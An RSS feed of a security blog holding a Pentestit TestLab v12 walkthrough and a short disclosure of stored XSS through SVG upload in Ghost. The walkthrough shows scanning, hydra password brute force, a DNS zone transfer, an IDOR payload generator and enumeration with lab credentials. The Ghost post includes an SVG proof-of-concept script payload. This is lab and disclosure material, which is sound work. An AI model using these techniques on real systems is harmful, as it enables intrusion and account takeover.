<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>üíª | Blog</title>
    <description>Hacking to learn, while learning to hack.
</description>
    <link>http://snoopysecurity.github.io/</link>
    <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 27 Feb 2019 22:56:44 +0000</pubDate>
    <lastBuildDate>Wed, 27 Feb 2019 22:56:44 +0000</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>Pentestit TestLab V12 Walkthrough</title>
        <description>&lt;p&gt;This walkthrough shows the process I used to capture and complete some systems within the Pentestit v12 test lab. This walkthrough contains my field notes I took when I was working through the box. The ‚ÄúTest lab‚Äù is presented as a computer network of virtual companies containing widely of distributed misconfigurations and vulnerabilities. Players will need to discover vulnerable hosts, exploit them and then find the token.&lt;/p&gt;

&lt;h3 id=&quot;mail-token&quot;&gt;Mail Token&lt;/h3&gt;

&lt;p&gt;The first step consists of the reconnaissance phase as ports scanning, banner grabbing, misconfigurations and so on. Once you create a free account, Pentestit will provide you a VPN configuration which you can then use to connect to the TestLab network. Once connected, the Lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;A port scan of the .12 system shows the following services open.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# nmap -sV 192.168.101.12 -T4 -p- -vv

Completed Service scan at 13:58, 8.28s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.101.12.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 1.49s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 13:58
Completed NSE at 13:58, 0.00s elapsed
Nmap scan report for site.test.lab (192.168.101.12)
Host is up, received echo-reply ttl 62 (0.12s latency).
Scanned at 2019-01-19 13:53:27 EST for 329s
Not shown: 65531 filtered ports
Reason: 65531 no-responses
PORT     STATE SERVICE REASON         VERSION
25/tcp   open  smtp    syn-ack ttl 61 Postfix smtpd
80/tcp   open  http    syn-ack ttl 61 nginx 1.14.2
143/tcp  open  imap    syn-ack ttl 61 Dovecot imapd
8080/tcp open  http    syn-ack ttl 61 nginx
Service Info: Host: -mail.test.lab

Read data files from: /usr/bin/../share/nmap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Browsing to port 80 shows a WordPress site in use and a Roundcube Webmail instance was discoverable on port 8080. After quickly discovering the virtual host is called site.test.lab, the /etc/hosts file can be modified to include this information. WPScan can be used to enumerate the WordPress installation&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# wpscan --url http://site.test.lab --random-user-agent
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.3.1
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://site.test.lab/
[+] Started: Fri Jan 18 18:18:44 2019

Interesting Finding(s):

[+] http://site.test.lab/
 | Interesting Entry: Server: nginx/1.14.2
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://site.test.lab/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.9.8 identified.
 | Detected By: Rss Generator (Passive Detection)
 |  - http://site.test.lab/?feed=rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |  - http://site.test.lab/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=4.9.8&amp;lt;/generator&amp;gt;
 |
 | [!] 7 vulnerabilities identified:
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress &amp;lt;= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a

[+] WordPress theme in use: twentyseventeen
 | Location: http://site.test.lab/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-01-09T00:00:00.000Z
 | Readme: http://site.test.lab/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.7 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://site.test.lab/wp-content/themes/twentyseventeen/style.css?ver=4.9.8, Match: 'Version: 1.7'

[+] Enumerating All Plugins
[+] Checking Plugin Versions

[i] Plugin(s) Identified:

[+] wp-survey-and-poll
 | Location: http://site.test.lab/wp-content/plugins/wp-survey-and-poll/
 | Last Updated: 2019-01-14T22:50:00.000Z
 | [!] The version is out of date, the latest version is 1.5.8
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.7.8 (50% confidence)
 | Detected By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://site.test.lab/wp-content/plugins/wp-survey-and-poll/readme.txt

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:00 &amp;lt;===============================================================================================&amp;gt; (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Finished: Fri Jan 18 18:18:52 2019
[+] Requests Done: 53
[+] Memory used: 60.688 MB
[+] Elapsed time: 00:00:07
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Spidering of the application also revealed additional information regarding the themes and plugins in use. However, these were found hard to exploit due to the use of a Web Application Firewall within the WordPress application. However, by looking at the main WordPress webpage. It was possible to identify a email/username.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;wordpressuser&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using this username, brute force attacks can now be conducted to possibly get access to to to the Roundcube Webmail instance, WordPress dashboard, or the IMAP. After trying all three potential targets, the password of the info user was successfully brute forced by leveraging the IMAP service.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/# hydra -l info@test.lab -P /root/rockyou.txt imap://192.168.101.12/PLAIN
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2019-01-19 14:08:43
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking imap://192.168.101.12:143/PLAIN
[143][imap] host: 192.168.101.12   login: info@test.lab   password: 123456789
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2019-01-19 14:08:50
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using the found password, it was possible to successfully login to the Roundcube Webmail as the &lt;strong&gt;info&lt;/strong&gt; user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/2.JPG&quot; alt=&quot;alt text&quot; title=&quot;roundcube&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking through the info user‚Äôs emails, it was possible to find the Mail token, and get hold of a VPN configuration file. A possible username called &lt;strong&gt;sviridov@test.lab&lt;/strong&gt; was also found my looking through the inbox.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/3.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnconfig&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dns-token&quot;&gt;DNS Token&lt;/h3&gt;

&lt;p&gt;Using the found credentials and the VPN config file, a VPN connection can be established and tunnelled through the already established VPN connection. This can be done as seen below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/4.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpnconnection&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By looking around, the new subnet that is accessible seems to be &lt;code class=&quot;highlighter-rouge&quot;&gt;172.16.0.0/16&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# ip ro show dev tun1
10.11.0.1 via 10.11.0.25 
10.11.0.25 proto kernel scope link src 10.11.0.26 
172.16.0.0/16 via 10.11.0.25 
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A nmap scan with the fast (-F) option can be conducted to quickly find open services. It is worth disabling host discovery within nmap for better coverage.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -F -n 172.16.0.0/16 -v -Pn
[SHORTENED FOR ABBREVIATION]

Nmap scan report for 172.16.0.10
Host is up (0.10s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.16.0.17
Host is up (0.10s latency).
Not shown: 89 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
389/tcp  open  ldap
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

Nmap scan report for 172.16.2.10
Host is up (0.051s latency).
Not shown: 99 filtered ports
PORT   STATE SERVICE
53/tcp open  domain


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The results discovered multiple DNS servers. One of these DNS servers allowed zone transfers.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:# dig axfr test.lab @172.16.2.10

; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.11.4-P2-3-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr test.lab @172.16.2.10
;; global options: +cmd
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
test.lab.		21600	IN	NS	ns1.test.lab.
test.lab.		21600	IN	NS	ns2.test.lab.
test.lab.		21600	IN	A	172.16.0.17
_kerberos._tcp.dc._msdcs.test.lab. 21600 IN SRV	0 0 88 test.lab.
_ldap._tcp.dc._msdcs.test.lab. 21600 IN	SRV	0 0 389 test.lab.
gc._msdcs.test.lab.	21600	IN	A	172.16.0.17
_ldap._tcp.gc._msdcs.test.lab. 21600 IN	SRV	0 0 3268 test.lab.
_kerberos._tcp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._tcp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
_ldap._tcp.test.lab.	21600	IN	SRV	0 0 389 test.lab.
_kerberos._udp.test.lab. 21600	IN	SRV	0 0 88 test.lab.
_kpasswd._udp.test.lab.	21600	IN	SRV	0 0 464 test.lab.
ad.test.lab.		21600	IN	A	172.16.0.17
db.test.lab.		21600	IN	A	172.16.0.30
dc.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.0.17
dns.test.lab.		21600	IN	A	172.16.2.10
_ldap._tcp.ForestDnsZones.test.lab. 21600 IN SRV 0 0 389 test.lab.
helpdesk.test.lab.	21600	IN	A	172.16.0.10    
my.test.lab.		21600	IN	A	172.16.0.10
ns1.test.lab.		21600	IN	A	172.16.0.17
ns2.test.lab.		21600	IN	A	172.16.2.10
site.test.lab.		21600	IN	A	172.16.0.10
[TOKENREMOVEDFROM].test.lab. 21600 IN	A	127.0.0.1
test.lab.		21600	IN	SOA	test.lab. ad.test.lab. 69 5 30 21600 60
;; Query time: 169 msec
;; SERVER: 172.16.2.10#53(172.16.2.10)
;; WHEN: Sat Jan 19 18:14:26 EST 2019
;; XFR size: 26 records (messages 1, bytes 778
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The DNS token was discovered within the given results.&lt;/p&gt;

&lt;h3 id=&quot;helpdesk-token&quot;&gt;Helpdesk Token&lt;/h3&gt;

&lt;p&gt;The IP address and the correct hostname for the helpdesk system can be discovered through the obtain DNS records. A quick port scan revealed that this machine is hosting a web application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/5.JPG&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The previously obtained info user credentials can be used to login in to this application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.png&quot; alt=&quot;alt text&quot; title=&quot;helpdesk&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observing the change password area of the helpdesk discovered the use of an obfuscated ID parameter which could potentially be vulnerable to Insecure Direct Object Reference.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/6.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The value of the ID parameter was found to be Base64 decoded. An decoded example of this value can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/7.JPG&quot; alt=&quot;alt text&quot; title=&quot;changepass&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By iterating through a list of parameter values, it could be possible to reset the password for the sviridov user. It should be noted that to generate valid values for the ID parameter, a list of numbers should be generate with a new line at the end. The following PHP code can be used to generate these values.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php  
for ($x = 0; $x &amp;lt;= 500; $x++) {
    echo base64_encode($x.'
');
    echo '&amp;lt;br&amp;gt;';
}
?&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This payload list can now be used with Burp Intruder to reset the password of the sviridov user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/8.JPG&quot; alt=&quot;alt text&quot; title=&quot;intruder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The helpdesk token and the network password of the sviridov user can be found by logging in to the Helpdesk application with the changed password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/9.JPG&quot; alt=&quot;alt text&quot; title=&quot;sviridov&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ad-token&quot;&gt;AD Token&lt;/h3&gt;

&lt;p&gt;The domain controller IP address in use for the TEST domain can be found by looking through the DNS records found earlier through the DNS Zone transfer. By conducting a authenticated NetBIOS using enum4linux, information about the domain can be gathered including the AD token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/var/www/html# enum4linux -u 'sviridov@test.lab' -p '5BEiBBtrNq695A!6u5zUR5KxC' -U 172.16.0.17 -a
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 27 10:02:59 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 172.16.0.17
RID Range ........ 500-550,1000-1050
Username ......... 'sviridov@test.lab'
Password ......... '5BEiBBtrNq695A!6u5zUR5KxC'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 172.16.0.17    |
 =================================================== 
[+] Got domain/workgroup name: TEST

 ==================================== 
|    Session Check on 172.16.0.17    |
 ==================================== 
[+] Server 172.16.0.17 allows sessions using username 'sviridov@test.lab', password '5BEiBBtrNq695A!6u5zUR5KxC'

 ========================================== 
|    Getting domain SID for 172.16.0.17    |
 ========================================== 
Domain Name: TEST
Domain Sid: S-1-5-21-583374519-1042395902-3096671009
[+] Host is part of a domain (not a workgroup)

 ============================ 
|    Users on 172.16.0.17    |
 ============================ 
index: 0x1 RID: 0x45e acb: 0x00000010 Account: token_fopekr0mf	Name: 	Desc: 
index: 0x2 RID: 0x1f4 acb: 0x00000010 Account: Administrator	Name: 	Desc: Built-in account for administering the computer/domain
index: 0x3 RID: 0x457 acb: 0x00000010 Account: lomonosov	Name: 	Desc: 
index: 0x4 RID: 0x452 acb: 0x00000010 Account: sviridov	Name: 	Desc: 
index: 0x5 RID: 0x454 acb: 0x00000010 Account: sidorov	Name: 	Desc: 
index: 0x6 RID: 0x1f6 acb: 0x00000011 Account: krbtgt	Name: 	Desc: Key Distribution Center Service Account
index: 0x7 RID: 0x456 acb: 0x00000010 Account: petrov	Name: 	Desc: 
index: 0x8 RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: 	Desc: Built-in account for guest access to the computer/domain
index: 0x9 RID: 0x450 acb: 0x00000010 Account: info	Name:  info	Desc: 

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[info] rid:[0x450]
user:[sviridov] rid:[0x452]
user:[sidorov] rid:[0x454]
user:[petrov] rid:[0x456]
user:[lomonosov] rid:[0x457]
user:[token_fopekr0mf] rid:[0x45e]
enum4linux complete on Sun Jan 27 10:03:06 2019

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;vpn-token&quot;&gt;VPN Token&lt;/h3&gt;

&lt;p&gt;The initial information provided by Pentestit was that lab gateways are &lt;strong&gt;192.168.101.12&lt;/strong&gt; and &lt;strong&gt;192.168.101.13&lt;/strong&gt;. 192.168.101.13 was accessible by downloading the VPN configuration obtained through the mail token challenge.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/10.JPG&quot; alt=&quot;alt text&quot; title=&quot;secondvpn&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The VPN configuration can be modified to connect to the 192.168.101.12 VPN. The sviridov credentials previously obtained will need to be used for successful authentication.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# ip ro show dev tun1
10.12.0.1 via 10.12.0.145 
10.12.0.145 proto kernel scope link src 10.12.0.146 
172.16.0.0/16 via 10.12.0.145 
192.168.0.0/24 via 10.12.0.145
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The same 172 network range seems to be accessible but network Access Control Lists might not been in place. A port scan of this range revealed the following systems&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Host is up, received user-set (0.074s latency).
Scanned at 2019-01-27 13:20:40 EST for 66s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.11
Host is up, received user-set (0.058s latency).
Scanned at 2019-01-27 13:20:40 EST for 68s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
25/tcp  open  smtp    syn-ack
143/tcp open  imap    syn-ack

Nmap scan report for 172.16.0.14
Host is up, received user-set (0.076s latency).
Scanned at 2019-01-27 13:20:40 EST for 67s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.0.17
Host is up, received user-set (0.067s latency).
Scanned at 2019-01-27 13:20:40 EST for 62s
Not shown: 75 closed ports, 19 filtered ports
Reason: 75 conn-refused and 19 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
53/tcp  open  domain       syn-ack
135/tcp open  msrpc        syn-ack
139/tcp open  netbios-ssn  syn-ack
389/tcp open  ldap         syn-ack
445/tcp open  microsoft-ds syn-ack

Nmap scan report for 172.16.1.10
Host is up, received user-set (0.080s latency).
Scanned at 2019-01-27 14:26:04 EST for 180s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.12
Host is up, received user-set (0.063s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.15
Host is up, received user-set (0.068s latency).
Scanned at 2019-01-27 14:26:04 EST for 182s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Nmap scan report for 172.16.1.20
Host is up, received user-set (0.087s latency).
Scanned at 2019-01-27 14:26:04 EST for 179s
Not shown: 98 filtered ports
Reason: 98 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
8000/tcp open  http-alt syn-ack

Nmap scan report for 172.16.1.25
Host is up, received user-set (0.15s latency).
Scanned at 2019-01-27 14:26:04 EST for 177s
Not shown: 99 filtered ports
Reason: 99 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Browsing to port 80 using a web browser revealed the following token&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/pentestit/11.JPG&quot; alt=&quot;alt text&quot; title=&quot;vpnhost&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Mon, 21 Jan 2019 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/netsec/2019/01/21/10_pentestit_v12_walkthrough.html</guid>
        
        <category>pentestit</category>
        
        
        <category>Netsec</category>
        
      </item>
    
      <item>
        <title>Ghost Publishing Platform ‚Äì SVG Image Upload to Stored Cross-site scripting</title>
        <description>&lt;p&gt;Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript.  if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. 
Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS.
Scalable Vector Graphics (SVG).&lt;/p&gt;

&lt;p&gt;Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations.
It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&amp;gt;
    &amp;lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&amp;gt;
   &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
      alert(document.domain);
      alert(document.location);
   &amp;lt;/script&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.&lt;/p&gt;

&lt;p&gt;It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;https://snoopysecurity.github.io/test.svg&quot; alt=&quot;test&quot; &quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However, in certain scenarios an &amp;lt;object&amp;gt; element can be used to load and embed an SVG document externally.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object id=&quot;test&quot; data=&quot;https://snoopysecurity.github.io/test.svg&quot;&amp;gt;&amp;lt;/object&amp;gt;
&amp;lt;embed src=&quot;https://snoopysecurity.github.io/test.svg&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;ghost-publishing-platform&quot;&gt;Ghost Publishing Platform&lt;/h3&gt;
&lt;p&gt;Ghost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/1.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/2.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The image location of the stored SVG document can be visited to execute the stored JavaScript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/3.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.&lt;/p&gt;

&lt;p&gt;This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator.&lt;/p&gt;

